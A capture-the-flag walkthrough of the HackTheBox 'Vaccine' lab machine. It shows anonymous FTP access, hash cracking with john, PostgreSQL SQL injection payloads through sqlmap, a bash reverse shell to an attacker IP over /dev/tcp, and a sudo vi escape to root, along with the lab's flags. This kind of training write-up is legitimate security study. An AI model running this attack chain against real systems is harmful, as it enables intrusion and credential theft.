# Vaccine

---

IP = `10.129.95.174`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# ftp 10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10659|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10559|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |**************************************************|  2533       25.69 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (8.06 KiB/s)
ftp> exit
221 Goodbye.
```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password:

```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# zip2john backup.zip > backup-john.txt
```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# john backup-john.txt --wordlist=/usr/share/wordlists/rockyou.txt
--SNIP--
741852963        (backup.zip)
--SNIP--
```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# cat index.php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
--SNIP--
```

`2cb42f8734ea607eefed3b70af13bbd3` is the md5 of the real password

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# echo "2cb42f8734ea607eefed3b70af13bbd3" > admin-md5
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt admin-md5 --format=Raw-md5
--SNIP--
qwerty789        (?)
--SNIP--
```

`admin : qwerty789`

successfully logged in to http://10.129.95.174/index.php

http://10.129.95.174/index.php -> http://10.129.95.174/dashboard.php

search a term and capture the traffic using burp

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# cat dashboard.req
GET /dashboard.php?search=a HTTP/1.1
Host: 10.129.95.174
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.174/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48erbc8352njksfte2earhgvhl
Connection: keep-alive

```

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# sqlmap --os-shell -r dashboard.req
--SNIP--
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=a' AND (SELECT (CASE WHEN (4250=4250) THEN NULL ELSE CAST((CHR(85)||CHR(101)||CHR(67)||CHR(68)) AS NUMERIC) END)) IS NULL-- OmOB

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=a' AND 8642=CAST((CHR(113)||CHR(113)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8642=8642) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)-- hyYN

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=a' AND 5326=(SELECT 5326 FROM PG_SLEEP(5))-- oKvZ
---
--SNIP--
os-shell> id
do you want to retrieve the command standard output? [Y/n/a]

[05:03:47] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(s...
command standard output: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
os-shell>

```

`os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.142/4444 0>&1"`

```
┌──(root㉿core)-[/work/ctf/htb/vaccine]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.142] from (UNKNOWN) [10.129.95.174] 57106
bash: cannot set terminal process group (2916): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$

```

```
postgres@vaccine:/var/lib/postgresql/11/main$ cd ../..
postgres@vaccine:/var/lib/postgresql$ ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:/var/lib/postgresql$
```

> user.txt

`ec9b13ca4d6229cd5cc1e09980965bf7`

```
postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
cd /var/www/html
postgres@vaccine:/var/www/html$ ls
ls
bg.png
dashboard.css
dashboard.js
dashboard.php
index.php
license.txt
style.css
postgres@vaccine:/var/www/html$ cat dashboard.php
--SNIP--
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
--SNIP--
```

potential password for postgres is `P@s5w0rd!`

`ssh postgres@10.129.95.174`

Successfully logged in

```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres:
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$
```

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

:!/bin/sh
```

```
# whoami
\root
#
```

> root.txt

`dd6e058e814260bc70e9bbdef2715849`